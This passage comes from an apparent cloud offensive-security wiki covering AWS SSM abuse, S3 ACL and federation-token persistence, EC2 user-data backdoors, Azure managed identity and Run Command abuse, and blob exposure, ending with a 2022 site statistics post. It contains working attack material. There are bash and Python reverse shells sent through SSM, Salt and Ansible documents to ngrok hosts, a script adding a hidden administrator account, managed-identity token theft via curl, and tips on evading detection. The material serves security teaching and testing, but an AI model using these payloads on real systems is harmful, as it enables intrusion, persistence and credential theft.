&gt;&amp;196 2&gt;&amp;196\n</code></pre> <p>The downside is that Salt Stack needs to be installed on the target system and that\u2019s not the case by default.</p> <p>For this document, as well as for the rest of them, we can create parameterized payloads. Meaning that we will use a single generic payload and pass the host and port as parameters.</p> <pre><code># source: https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-RunSaltState/linux/reverse_shell.yml\nmycommand:\n  cmd.run:\n    - name: 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{{host}}/{{port}}; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n</code></pre> <p>Example usage:</p> <pre><code>aws ssm send-command --document-name AWS-RunSaltState \\\n    --instance-id i-06ae9883fe6e5d721 \\\n    --parameters \\\n'{\"stateurl\":[\"https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunSaltState/linux/reverse_shell.yml\"], \"pillars\":[\"{\\\"host\\\":\\\"7.tcp.eu.ngrok.io\\\", \\\"port\\\":\\\"14460\\\"}\"]}'\n</code></pre>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-applyansibleplaybooks","title":"AWS-ApplyAnsiblePlaybooks","text":"<p>It downloads from remote locations Ansible Playbooks and executes them. It can download from S3 Buckets or GitHub repositories.</p> <p>The advantage here is that it can also install Ansible on the system.</p> <p>The parameterized Ansible Playbook for getting a reverse shell:</p> <pre><code># Source: https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-ApplyAnsiblePlaybooks/linux/reverse_shell.yml\n---\n  - name: \"Playing with Ansible and Git\"\n    hosts: localhost\n    connection: local \n    tasks:\n\n    - name: \"Saying hi from remote host\"\n      shell: \"0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{{host}}/{{port}}; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\"\n</code></pre> <p>Example usage:</p> <pre><code>aws ssm send-command --instance-id i-0ecad5485f77f18f4 \\\n    --document-name \"AWS-ApplyAnsiblePlaybooks\" \\\n    --parameters \\\n'{\"SourceType\":[\"GitHub\"],\"SourceInfo\":[\"{\\\"owner\\\":\\\"saw-your-packet\\\", \\\"repository\\\":\\\"fun-with-ssm\\\",\\\"path\\\":\\\"AWS-ApplyAnsiblePlaybooks/linux/\\\", \\\"getOptions\\\":\\\"branch:main\\\"}\"],\"InstallDependencies\":[\"True\"],\"PlaybookFile\":[\"reverse_shell.yml\"],\"ExtraVariables\":[\"host=6.tcp.eu.ngrok.io port=13012\"]}'\n</code></pre> <p>Because it is a GitHub repository, we have to specify more parameters than an HTTP server. Besides that, the parameters of interest are:</p> <ul> <li>InstallDependencies<ul> <li>Set to true for installing Ansible on the system</li> </ul> </li> <li>ExtraVariables<ul> <li>Here we specify the host and port where to receive the reverse shell</li> </ul> </li> </ul>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-runansibleplaybook","title":"AWS-RunAnsiblePlaybook","text":"<p>It does the same thing as AWS-ApplyAnsiblePlaybook with some differences:</p> <ul> <li>Can download only from S3 Buckets and HTTP(S) servers</li> <li>It requires Ansible to be already installed on the system</li> <li>The same Ansible Playbook can be used, but the command to send the command is different</li> </ul> <pre><code>aws ssm send-command --document-name \"AWS-RunAnsiblePlaybook\" \\\n    --instance-id i-0ecad5485f77f18f4 \\\n    --parameters \\\n'{\"playbookurl\":[\"https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunAnsiblePlaybook/linux/reverse_shell.yml\"],\"extravars\":[\"host=7.tcp.eu.ngrok.io port=14355\"]}'\n</code></pre>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-installpowershellmodule","title":"AWS-InstallPowerShellModule","text":"<p>It downloads from remote locations PS modules and installs them. It only supports HTTP(S) servers.</p> <p>The way the document is build, it allows you to execute an arbitrary command after the module was installed. Because of this, the PS module doesn\u2019t need to be malicious.</p> <p>Example usage:</p> <pre><code>aws ssm send-command --document-name \"AWS-InstallPowerShellModule\" \\\n    --instance-id i-06ae9883fe6e5d721 \\\n    --parameters '{\"source\":[\"https://your-server.com/module.ps1\"], \"commands\":[\"whoami\"]}'\n</code></pre>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-installapplication","title":"AWS-InstallApplication","text":"<p>It downloads from remote locations MSI files and installs them. It only supports HTTP(S) servers. You can pass arguments to the MSI installation if want to. You need to be aware of AV at this point if the file is malicious.</p> <p>Example usage:</p> <pre><code>aws ssm send-command --document-name \"AWS-InstallApplication\" \\\n    --instance-id i-06ae9883fe6e5d721 \\\n    --parameters '{\"action\":[\"Install\"], \"parameters\":[\"parameters\"], \"source\":[\"https://your-server.com/file.msi\"]}'\n</code></pre>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-runremotescript","title":"AWS-RunRemoteScript","text":"<p>It downloads from remote locations scripts and executes them. It supports S3 Buckets and GitHub repositories. It works for both UNIX and Windows machines.</p> <p>Example usage:</p> <pre><code>aws ssm send-command --document-name \"AWS-RunRemoteScript\" \\\n    --instance-id i-06ae9883fe6e5d721 \\\n    --parameters '{\"sourceType\":[\"S3\"], \"sourceInfo\":[\"{\\\"path\\\":\\\"s3://my-bucket/script.sh\\\"}\"]}'\n</code></pre>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-rundocument","title":"AWS-RunDocument","text":"<p>Last, but not least, AWS-RunDocument. This is a special one. It downloads and executes other SSM Documents. Let\u2019s take a moment to understand this better.</p> <p>So, let\u2019s say the cloud engineer extended the deny list from the initial policy and blocked all the other SSM Documents presented above.</p> <p></p> <p>Well, if AWS-RunDocument is not blocked then the policy is useless. You can copy the content of, let\u2019s say, AWS-RunShellScript document, store it on your server and use AWS-RunDocument to execute a replica of the AWS-RunShellScript document, which will result in the exact outcome as if you would have used AWS-RunShellScript directly.</p> <p>It can downloads documents from GitHub repositories, S3 Buckets, HTTP(S) servers, but also can get a document as parameter from CLI. Same as for the other documents, you can create parameterized payloads that can be reused. It offers infinite possibilities in terms of what can you do.</p> <p>Here is an example of malicious SSM Document that will generate a reverse shell through python (I don\u2019t know why, but the Bash TCP payload doesn\u2019t work with AWS-RunDocument).</p> <p>Source: https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-RunDocument/linux/Reverse-Shell-Python</p> <pre><code>{\n  \"schemaVersion\": \"2.2\",\n  \"description\": \"rev shell document linux\",\n  \"parameters\": {\n    \"host\": {\n      \"description\": \"(Required) Specify the host.\",\n      \"type\": \"String\"\n    },\n    \"port\": {\n      \"description\": \"(Optional) Specify the port. The default value is 4444.\",\n      \"type\": \"String\",\n      \"default\": \"4444\"\n    }\n  },\n  \"mainSteps\": [\n    {\n      \"action\": \"aws:runShellScript\",\n      \"name\": \"shell\",\n      \"inputs\": {\n        \"runCommand\": [\n          \"port={{ port }}\",\n          \"host1={{ host }}\",\n          \"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"'$host1'\\\",'$port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")'\"\n        ]\n      }\n    }\n  ]\n}\n</code></pre> <p>Example usage:</p> <pre><code>ws ssm send-command --document-name \"AWS-RunDocument\" \\\n    --instance-id i-06ae9883fe6e5d721 \\\n    --parameters '{\"sourceType\":[\"GitHub\"],\"sourceInfo\":[\"{\\\"owner\\\":\\\"saw-your-packet\\\", \\\"repository\\\":\\\"fun-with-ssm\\\", \\\"path\\\":\\\"AWS-RunDocument/linux/Reverse-Shell-Python\\\",\\\"getOptions\\\":\\\"branch:main\\\"}\"], \"documentParameters\":[\"{\\\"host\\\":\\\"2.tcp.eu.ngrok.io\\\",\\\"port\\\":\\\"11448\\\"}\"]}'\n</code></pre> <p>The parameter of interest is documentParameters which allow us to pass our host and port to the document. Cool, right?</p> <p>As an extension of this research, I started making malicious SSM documents. You can check them here: https://github.com/saw-your-packet/fun-with-ssm/tree/main/AWS-RunDocument</p> <p>More details about the advanced usage of SSM Run Command can be found in my talk: The C2 tool no one talks about: AWS SSM \u2013 Run Command at DefCamp 2023</p>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#session-manager","title":"Session Manager","text":"<ul> <li> <p> Required IAM Permissions</p> <ul> <li>ssm:StartSession</li> </ul> </li> </ul> <p>If instead you'd like a more interactive shell experience, you can make use of Session Manager. Session Manager allows you to have an SSH-esc experience, making it easy to interact with EC2 instances.</p> <p>To begin, you will first need to install the SSM Session Manager Plugin. The specifics of this will depend on what operating system you are using.</p> <p>With that installed, you can then run the following command to start an interactive session.</p> <pre><code>aws ssm start-session --target instance-id\n</code></pre>"},{"location":"aws/post_exploitation/s3_acl_persistence/","title":"S3 File ACL Persistence","text":""},{"location":"aws/post_exploitation/s3_acl_persistence/#requirements","title":"Requirements","text":"<p>For this scenario to work, you will need to have s3:PutBucketAcl, s3:PutObjectAcl, or PutObjectVersionAcl on the target s3 bucket or associated object.</p>"},{"location":"aws/post_exploitation/s3_acl_persistence/#purpose","title":"Purpose","text":"<p>When doing an assessment in AWS you may want to maintain access for an extended period of time, but you may not have the ability to create a new IAM user, create a new key for existing users, or even perform IAM role-chain juggling. How else can you extend your access? By backdooring key S3 resources using S3 Access Control Lists (ACLs).  </p>"},{"location":"aws/post_exploitation/s3_acl_persistence/#background-on-sensitive-s3-use-cases","title":"Background on Sensitive S3 Use Cases","text":"<p>Many organizations have grown to use AWS S3 to store Terraform state files, CloudFormation Templates, SSM scripts, application source code, and/or automation scripts used to manage specific account resources (EC2 instances, Lambda Functions, etc.)  During post-exploitation, you may identify opportunities to access these resources. Provisioning write, or in some cases read only access to these resources, may provide persistent access to credentials for the AWS account and/or resources provisioned in the account. Furthermore, write access specifically may allow an attacker to update configuration files, source code for applications, and/or automation code that modifies downstream resources in the account. On the next update/execution of the relevant data/code, this may allow an attacker to further extend access to other resources in the account, or even beyond the specific AWS account accessed. This brings us to the method: S3 ACL Access Control.  </p>"},{"location":"aws/post_exploitation/s3_acl_persistence/#technique","title":"Technique","text":"<p>S3 ACL Access Control is a recognized functionality of AWS in that you can use an access control list to allow access to S3 buckets from outside your own AWS account without configuring an Identity-based or Resource-based IAM policy. While many organizations may be prepared to alert on S3 buckets made public via resource policy, this alerting may not extend to capabilities associated with bucket or object ACLs. Furthermore, subtler configurations that expose bucket or object resources to other accounts via ACLs may go undetected by organizations, even those with strong alerting capabilities. Using these permissions, you can extend your access by allowing other AWS accounts you control to read or write objects, buckets, and bucket ACLs. Furthermore, the access can be extended to AUTHENTICATED USERS, which is a term AWS uses to describe any AWS IAM principal in any other AWS account. The access can also be extended to ANY USER which is a term AWS uses to describe anonymous access that does not require authentication.</p>"},{"location":"aws/post_exploitation/s3_acl_persistence/#key-considerations","title":"Key Considerations","text":"<ol> <li>Bucket Public Access Block will prevent S3 bucket ACLs from being configured to allow public (ANY USER) access. If configured, it will provide some limitations to this technique.  It does not, however, block the sharing of an s3 object to a specific account, due to what AWS classifes as 'public'.</li> <li>ACLs for Buckets or objects can be disabled at the bucket level, which would mandate the bucket owner as the object owner no matter who uploads the object. From April 2023, AWS will make this the default for all newly created buckets.  </li> </ol>"},{"location":"aws/post_exploitation/survive_access_key_deletion_with_sts_getfederationtoken/","title":"Survive Access Key Deletion with sts:GetFederationToken","text":"<ul> <li> <p> Technique seen in the wild</p> <ul> <li>How Adversaries Can Persist with AWS User Federation</li> </ul> </li> <li> <p> Required IAM Permission</p> <ul> <li>sts:GetFederationToken</li> </ul> </li> </ul> <p>After identifying that access keys have been compromised by an adversary, defenders will often immediately deactivate or delete those credentials. This is a good practice as it theoretically disables an adversary's access to the environment. However, it is important to know that an adversary can still use credentials generated from <code>sts:GetFederationToken</code>, even if the original access keys have been deleted.</p> <p><code>sts:GetFederationToken</code> is an API that can be invoked by IAM users and returns a set of temporary (ASIA...) IAM credentials. These credentials can be used normally through the CLI with 2 exceptions. From the documentation:</p> <ul> <li>You cannot call any IAM operations using the AWS CLI or the AWS API. </li> <li>You cannot call any AWS STS operations except <code>sts:GetCallerIdentity</code>.</li> </ul> <p>However, it is important to note that these limitations do not apply if an attacker generates a console session from IAM credentials. By using the AWS console you could interact with the IAM service and perform actions such as privilege escalation, maintaining persistence, etc.</p> <p>Tip</p> <p>If you are attempting to avoid detection, generating a console session from IAM credentials is NOT advised. There are numerous IoCs which may trigger alerts, such as a suspicious user-agent and the <code>ConsoleLogin</code> CloudTrail event. If at all possible, only use the IAM credentials generated from <code>sts:GetFederationToken</code> in the CLI.</p> <p>To create temporary IAM credentials using <code>sts:GetFederationToken</code>, you can use the following CLI command:</p> <pre><code>aws sts get-federation-token \\\n--name your_choice \\\n--policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess \\\n--duration-seconds 129600\n</code></pre> <p>Warning</p> <p>While all 3 parameters are configurable by the attacker, keep in mind the potential for detection based on this. For instance, in a highly monitored environment, would the use of the <code>AdministratorAccess</code> policy raise suspicions? What about an extremely long lived session?</p> <p>It is important to note that the provided <code>policy-arns</code> will use the intersection of the permissions that were passed. Meaning that if the user has no permissions, passing the <code>AdministratorAccess</code> policy will not provide it admin access to the account. This can, however, be helpful if you don't know what level of privilege you've compromised. By passing a highly privileged policy, you will ensure you will get the full access afforded to the identity.</p> <p>Tip</p> <p>In addition to passing a policy ARN, you can also pass an inline policy, which may be helpful to avoid suspicious use of certain policies.</p> <p>For defenders, in addition to deactivating or deleting IAM user access keys, it may be worthwhile to attach a \"DenyAll\" policy to the compromised user. This would ensure that even if an adversary was using this technique, they would not be able to use their generated credentials.</p> <p>It is also advisable to determine how common the use of <code>sts:GetFederationToken</code> is in your environments and alert on its use, or implement a Service Control Policy to prevent it.</p>"},{"location":"aws/post_exploitation/user_data_script_persistence/","title":"User Data Script Persistence","text":"<p>When using EC2 instances a common design pattern is to define a user data script to be run when an instance is first started or after a reboot. These scripts are typically used to install software, download a config, etc. Additionally these scripts are run as root or System which makes them even more useful. Should we gain access to an EC2 instance we may be able to persist by abusing user data scripts via two different methods.</p>"},{"location":"aws/post_exploitation/user_data_script_persistence/#modify-the-user-data-script","title":"Modify the User Data Script","text":"<ul> <li> <p> Required IAM Permissions</p> <ul> <li>modify-instance-attribute</li> </ul> </li> <li> <p> Recommended but not Required IAM Permissions</p> <ul> <li>ec2:StartInstances</li> <li>ec2:DescribeInstances</li> <li>ec2:StopInstances</li> </ul> </li> </ul> <p>If we have permission to directly modify the user data scripts, we can potentially persist by adding our own backdoor to it. To do this, we must stop the instance because user data scripts can only be modified when the instance is stopped. You could theoretically wait for this to happen naturally, have a script that constantly tries to modify it, or stop it yourself if you have permissions to do so.</p> <p>The steps to modify user data scripts can be found here.</p>"},{"location":"aws/post_exploitation/user_data_script_persistence/#modify-a-resource-called-by-the-script","title":"Modify a Resource Called by the Script","text":"<p>In situations where we cannot modify the user data script itself, we may be able to modify a resource called by the script. Say for example a script is downloaded by an S3 bucket, we may be able to add our backdoor to it.</p>"},{"location":"azure/abusing-managed-identities/","title":"Abusing Managed Identities","text":"<ul> <li> <p> Original Research</p> <p>Create an Azure Vulnerable Lab: Part #4 \u2013 Managed Identities by Andrei Agape</p> </li> </ul> <p>Using Managed Identities it is possible to grant a resource (such as VM/WebApp/Function/etc) access to other resource (such as Vaults/Storage Accounts/etc.) For example, if we want to give our web application access to a private storage account container without having to deal with how we safely store connection strings in config files or source code, we could use a managed identity.</p> <pre><code>Compute Resource --&gt; Managed Identity --&gt; Assigned Role(s) --&gt; Storage Account --&gt; Container\n</code></pre> <p>A Managed Identity can be a System or User identity. A System identity is bound to the resource, but a User identity is independent.</p>"},{"location":"azure/abusing-managed-identities/#setup-azure-managed-identity","title":"Setup Azure Managed Identity","text":"<p>First we enable the managed identity for the web application:</p> <p>)</p> <p>Once enabled, we are given the possibility to configure the roles assigned for this identity (i.e: permissions granted to the service that we enabled the identity for).</p> <p></p> <p>Lastly, we assign one or more roles (which is a set of permissions) for that identity. A role can be assigned at Subscription level, Resource group, Storage Account, Vault or SQL and it propagates \u201cdownwards\u201d in the Azure architecture layer.</p> <p>The default Owner, owning the resource, and Contributor, read/write content of the resource, roles have the most permissions.</p> <p></p> <p>Under each role, we can see in details what permissions are included. Azure also allows the user to configure custom roles in the case that the built-in ones are not suitable for your needs.</p> <p></p> <p>Similarly, to see who has permissions granted for a given resource, we can check under the Access Control (IAM) -&gt; View access to this resource.</p> <p></p> <p>So in our case, we should see under the Storage Account that the web application has Reader and Data Access:</p> <p></p>"},{"location":"azure/abusing-managed-identities/#next-steps","title":"Next steps","text":"<p>Now that we have the basics of how Managed Identity works, let\u2019s see how can we exploit this. Since the web application has access to the storage account, and we compromised the web application, we should also be able to gain access to the storage account as well. Simply put, we get the same permissions that compromised resource has assignred to it. Based on how poorly the Identity roles are assigned, it could even be the case that the permissions are assigned at the Subscription level, effectively granting us access to all the resources within the subscription!</p> <p></p> <p>While in our case it appears that the permissions are proper (we are limiting access only to the Storage Account that we need access to) and limit the roles to Reader and Data Access (instead of Contributor or Owner), there is still a caveat that allows us to exploit the access privileges. The web app only requires permissions to access the \"images\" container, however the identity access has been misconfigured and allows the application read permissions for all keys on the storage account. Thus granting the attacker the ability to access any container within the same account. </p>"},{"location":"azure/abusing-managed-identities/#exploiting-azure-managed-identity","title":"Exploiting Azure Managed Identity","text":"<p>Utilising command injection on the web app, we are able to make a curl request to the $IDENTITY_ENDPOINT URL stored in the environment variables and get an Access token and Account ID (clientId in the response) which can be used to authenticate to Azure. <pre><code>curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01\" -H secret:$IDENTITY_HEADER\n</code></pre> </p> <p>Using the Azure Powershell module, we can connect to Azure with the access token:  <pre><code>PS&gt; Install-Module -Name Az -Repository PSGallery -Force\nPS&gt; Connect-AzAccount -AccessToken &lt;access_token&gt; -AccountId &lt;client_id&gt;\n</code></pre></p> <p>Once the connection has been established, you will be able to see the details for the tenant, subscription and other details the compromised managed identity has access to - using the Get-AzResource Azure Powershell cmdlet, we can check which resources inside the subscription we can access:</p> <p></p> <p>To list the roles assigned to the managed identity, we can use the Azure Powershell cmdlet Get-AzRoleAssignment. This cmdlet requires and additional token from the Graph API which we can get from the https://graph.microsoft.com/ endpoint, additionally it requires the permission to list roles and permissions for identities which the compromised Managed Identity does not have.</p> <p>However, you can still try to access the Storage Account keys without these permissions and see if they are successful. For that you can use the Get-AzStorageAccountKey cmdlet with the Resource Group Name and Account Name that was found in the previous step.</p> <p>Get storage account keys:</p> <pre><code>&gt;Get-AzStorageAccountKey -ResourceGroupName \"0xpwnlab\" -AccountName \"0xpwnstorageacc\"\n\nKeyName Value                       Permissions CreationTime\n------- -----                       ----------- ----------\nkey1    L175hccq[...]lH9DJ==        Full 3/12/20...\nkey2    vcZiPzJp[...]ZkKvA==        Full 3/12/20...\n</code></pre> <p>http://aka.ms/storage-explorer</p> <p>If the above command returns two keys, then it means that our identity had permissions to list them.  Assuming this is the case - let\u2019s use these keys in Azure Storage Explorer and see if there are other containers stored on the same account. </p> <p>In the Azure Storage Explorer, we click the connect icon and select storage account or service.</p> <p></p> <p>On the second step, this time we select the Account name and key option:</p> <p></p> <p>For the Account name we use the name that we enumerated in the Get-AzResource step, and for the key; either of the two returned keys will work:</p> <p></p> <p>Once we connect, on the left side menu we should find a new storage account, we see 2 containers: the images container used by the web app, but also another one containing the flag. </p> <p></p> <p>And that\u2019s it!  We have just seen how utilising a command injection into a web app, we discovered that it had a managed identity associated to it. After we got the JWT access token, we connected to Azure using the Azure Powershell CLI and enumerated the resources that we have access to.  The improper permissions set for the Managed Identity allowed us to read the access key for the whole Storage Account and discover another private container that was not referenced anywhere, containing the flag for sensitive information. </p>"},{"location":"azure/anonymous-blob-access/","title":"Anonymous Blob Access","text":"<ul> <li> <p> Original Research</p> <p>Create an Azure Vulnerable Lab: Part #1 \u2013 Anonymous Blob Access by Andrei Agape</p> </li> </ul> <p>\"Storage Accounts\" is the service provided by Azure to store data in the cloud. A storage account can used to store:</p> <ul> <li>Blobs</li> <li>File shares</li> <li>Tables</li> <li>Queues</li> <li>VM disks</li> </ul> <p></p> <p>For this tutorial, we will focus on the Blobs section. Blobs are stored within a container, and we can have multiple containers within a storage account. When we create a container, Azure will ask on the permissions that we grant for public access. We can chose between:</p> <ul> <li>Private Access \u2013 no anonymous access is allowed</li> <li>Blob Access \u2013 we can access the blobs anonymously, as long as we know the full URL (container name + blob name)</li> <li>Container Access \u2013 we can access the blobs anonymously, as long we know the container name (directory listing is enabled, and we can see all the files stored inside the container)</li> </ul> <p>As you might have guessed, granting Container Access permission can be easily abused to download all the files stored within the container without any permissions as the only things required to be known are the storage account name and the container name, both of which can be enumerated with wordlists.</p>"},{"location":"azure/anonymous-blob-access/#exploiting-anonymous-blob-access","title":"Exploiting Anonymous Blob Access","text":"<p>Now, there are thousands of articles explaining how this can be abused and how to search for insecure storage in Azure, but to make things easier I\u2019ll do a TL:DR. One of the easiest way is to use MicroBurst, provide the storage account name to search for, and it\u2019ll check if the containers exists based on a wordlist saved in the Misc/permutations.txt:</p> <pre><code>PS &gt; import-module .\\MicroBurst.psm1\nPS&gt; Invoke-EnumerateAzureBlobs -Base 0xpwnstorageacc\nFound Storage Account - 0xpwnstorageacc.blob.core.windows.net\nFound Container - 0xpwnstorageacc.blob.core.windows.net/public\nPublic File Available: https://0xpwnstorageacc.blob.core.windows.net/public/flag.txt\n</code></pre> <p>Alternatively adding <code>?restype=container&amp;comp=list</code> after the container name: <pre><code>https://&lt;storage_account&gt;.blob.core.windows.net/&lt;container&gt;?restype=container&amp;comp=list\n</code></pre> Output: <pre><code>&lt;EnumerationResults ContainerName=\"https://0xpwnstorageacc.blob.core.windows.net/public\"&gt;\n    &lt;Blobs&gt;\n        &lt;Blob&gt;\n            &lt;Name&gt;flag.txt&lt;/Name&gt;\n            &lt;Url&gt;\nhttps://0xpwnstorageacc.blob.core.windows.net/public/flag.txt\n&lt;/Url&gt;\n            &lt;Properties&gt;\n                &lt;Last-Modified&gt;Sat, 05 Mar 2022 18:02:14 GMT&lt;/Last-Modified&gt;\n                &lt;Etag&gt;0x8D9FED247B7848D&lt;/Etag&gt;\n                &lt;Content-Length&gt;34&lt;/Content-Length&gt;\n                &lt;Content-Type&gt;text/plain&lt;/Content-Type&gt;\n                &lt;Content-Encoding/&gt;\n                &lt;Content-Language/&gt;\n                &lt;Content-MD5&gt;lur6Yvd173x6Zl1HUGvtag==&lt;/Content-MD5&gt;\n                &lt;Cache-Control/&gt;\n                &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n                &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n            &lt;/Properties&gt;\n        &lt;/Blob&gt;\n    &lt;/Blobs&gt;\n    &lt;NextMarker/&gt;\n&lt;/EnumerationResults&gt;\n</code></pre></p>"},{"location":"azure/enum_email_addresses/","title":"Unauthenticated Enumeration of Valid Azure Active Directory Email Addresses","text":"<p>You can enumerate valid email addresses associated with the Azure Active Directory service using CredMaster or Quiet Riot. These addresses can be used for password spraying attacks, a technique where an attacker attempts to authenticate against multiple accounts using a set of commonly used passwords. This can potentially grant unauthorized access to the target account. It can also be used to test for valid Root User accounts in AWS, assuming that the email address is the same. Then, a similar password spraying approach can be implemented against identified AWS Root User accounts.</p>"},{"location":"azure/run-command-abuse/","title":"Run Command Abuse","text":"<ul> <li> <p> Original Research</p> <p>Azure Run Command for Dummies by Adrien Bataille, Anders Vejlby, Jared Scott Wilson, Nader Zaveri</p> </li> </ul>"},{"location":"azure/run-command-abuse/#technique","title":"Technique","text":"<p>MITRE: Execution &gt; Cloud Administration Command</p> <p>Run Command is an operation within Azure that allows administrators to run scripts on Windows and Linux virtual machines via the:</p> <ul> <li>Azure Portal,</li> <li>Azure CLI, and</li> <li>PowerShell</li> </ul> <p>Once configured the script is run via the virtual machine agent installed on the virtual machine.</p> <p>A script ran via Run Command runs with the following privleges:</p> <ul> <li><code>System</code> on Windows, and as </li> <li><code>root</code> on Linux</li> </ul> <p>In order to use this functionality an identity must have the following role assigned to it: <code>Microsoft.Compute/virtualMachines/runCommands/action</code></p> <p>This example focuses on the abuse of Run Commands against Windows hosts, however, the same methodology can be used to target Linux based virtual machines.</p> <p>The script that this example will utilise is as follows:</p> <pre><code>net user /add backdoor BingoBango123!\nnet localgroup administrators backdoor /add\n</code></pre> <p>This script:</p> <ul> <li>Creates a new user named <code>backdoor</code>, then</li> <li>Adds the user to the local <code>Administrator</code> group</li> </ul> <p>This example will use the Azure Portal to create and run the aforementioned script. More information on running these commands via the Azure CLI or PowerShell can be found within the relevant Microsoft documentation.</p> <p>Browsing to the virtual machine, we can select the Run Command option, enter our script then execute it, as depicted in the following screenshot:</p> <p></p> <p>Once the script has executed, we can authenticate to the virtual machine with our new credentials and check on it's status, as depicted in the following screenshot:</p> <p></p> <p>Here we can see that the script has successfully executed, and the <code>backdoor</code> user has been added to the local <code>Administrator</code> group.</p>"},{"location":"azure/run-command-abuse/#detection","title":"Detection","text":"<p>The following operation name can be used to audit and alert on Run Commands being used within a tenant: <code>Microsoft.Compute/virtualMachines/runCommand/action</code></p>"},{"location":"azure/run-command-abuse/#further-reading","title":"Further reading","text":"<ul> <li>https://learn.microsoft.com/en-us/azure/virtual-machines/windows/run-command</li> <li>https://learn.microsoft.com/en-us/azure/virtual-machines/linux/run-command</li> </ul>"},{"location":"azure/soft-deleted-blobs/","title":"Soft Deleted Blobs","text":"<ul> <li> <p> Original Research</p> <p>0xPwN Blog - Create an Azure Vulnerable Lab: Part #3 \u2013 Soft Deleted Blobs by Andrei Agape</p> </li> </ul> <p>In this tutorial we will see how data that has been deleted from a private Storage Account Container can still be a risk in some cases. Even if we know the full path of resources uploaded to a private container, Azure requires authentication to be accessed. To provide access we can choose between:</p> <ul> <li>A shared access signature (SAS) \u2013 is a URI that grants restricted access to an Azure Storage container. Use it when you want to grant access to storage account resources for a specific time range without sharing your storage account key.</li> <li>A connection string includes the authorization information required for your application to access data in an Azure Storage account at runtime using Shared Key authorization.</li> <li>Managed Identities</li> </ul> <p>For the sake of this tutorial, we will pretend to be a developer that uses the connection string and saves it in a config file/source code deployed to Azure. Additionally, the web application deployed has a command injection vulnerability.  We can find the connection string of a Storage Account in the Azure portal as shown below:</p> <p></p> <p>Now, the problem here is that we are giving access to the whole storage account by passing the connection string into the web app. Azure supports granular access for specific containers, for a limited amount of time, or event for a specific file within the container! But for convenience (or lack of knowledge), a developer might deploy the connection string for the entire storage account. Don\u2019t be that developer.</p> <p>The second part of this tutorial is about recovering deleted blobs. By default, when creating a storage container using the Portal, the Soft Deletion is enabled with 7 days retention time. Now image that you got access to a storage account with tens of containers, and someone at some point mistakenly uploaded an SSH key to one of these containers and than deleted it without being aware of the 7 day retention day \u201cfeature\u201d. </p> <p></p>"},{"location":"azure/soft-deleted-blobs/#exploiting-soft-deleted-blobs","title":"Exploiting Soft Deleted Blobs","text":"<p>Now, to exploit this vulnerability we navigate to the web application vulnerable to command injection and start poking around. Listing the files in the current directory, we can find among other the source code in the app.py:</p> <p></p> <p>Listing the contents of this file, we can see there is a connection string stored inside (our placeholder has been replaced at runtime with the actual value of the container):</p> <p></p> <p>Inside the Microsoft Azure Container Explorer, we specify that we want to connect to a storage account</p> <p></p> <p>And that we want to use a Connection String</p> <p></p> <p>And we paste the value of the conn_str variable that we found in the source code, and connect:</p> <p></p> <p>On the left side menu, a new storage account should show up. Navigate to the Blob Containers -&gt; images and open it:</p> <p></p> <p>At first glance, it seems that nothing of interest is stored here. Remember the flag that we accidentally uploaded? Change the view to Active and soft deleted blobs:</p> <p></p> <p>And voila! Right click -&gt; Undelete</p> <p></p>"},{"location":"blog/2022_wrap-up/","title":"2022 Wrap-up","text":"<p>Nick Frichette \u00b7 @frichette_n \u00b7   December 14, 2022   </p> <p>2022 is coming to a close and it's time to look back on the year. For Hacking the Cloud, 2022 has been a year of steady improvements. We've consistently had new content and new techniques added to the catalog throughout the year. We also expanded the type of content we offer with a full-blown, custom, CTF! With all that in mind, here are some accomplishments for the site this year, along with some noteworthy updates.</p>"},{"location":"blog/2022_wrap-up/#numbers","title":"Numbers","text":"<p>I think the best way to view how well the site is doing is to see some numbers. Here are some fun statistics. All data was pulled ~6PM Central, December 13th. In 2022, Hacking the Cloud has:</p> <ul> <li>625 stars gained on GitHub</li> <li>225 commits committed</li> <li>73,925 visits</li> <li>124,278 page views</li> <li>6,408 average monthly visitors (excluding December)</li> <li>9,763 average monthly visitors in the past quarter!</li> </ul> <p></p> <p>November in particular was a high traffic month, presumably because of multiple articles being released and gaining traction on Google's Discover.</p> <p>Compared to 2021, visitor count has increased over <code>94%</code>! (Note: 2022 is not over, hence the dotted line for 2022)</p> <p></p> <p>We have also reached 17 contributors officially on GitHub! I want to personally thank every single one of you who took the time to contribute to the site. Especially for Azure and GCP which I have no knowledge of. You all make this possible and I appreciate your contributions deeply.</p>"},{"location":"blog/2022_wrap-up/#most-popular-articles","title":"Most Popular Articles","text":"<p>Some more numbers; this time the most popular articles along with page views:</p> <ol> <li>Steal EC2 Metadata Credentials via SSRF - 10,963 page views!</li> <li>CI/CDon't - 5,842 page views.</li> <li>AWS Organizations Defaults - 5,325 page views.</li> <li>Connection Tracking - 5,209 page views.</li> <li>Using Stolen IAM Credentials - 5,043 page views.</li> </ol> <p>Once again, the Steal EC2 Metadata Credentials via SSRF article was the number one most popular page on the site! I think this is mostly attributed to high SEO ranking, along with it being a crucial security topic. </p> <p>CI/CDon't was a surprise runner up, but a happy surprise. I made this CTF specifically for Hacking the Cloud to cover some important security topics. I'm hoping that view count is indicative that folks enjoyed it and perhaps a few played it themselves.</p> <p>Using Stolen IAM Credentials ranking in the top 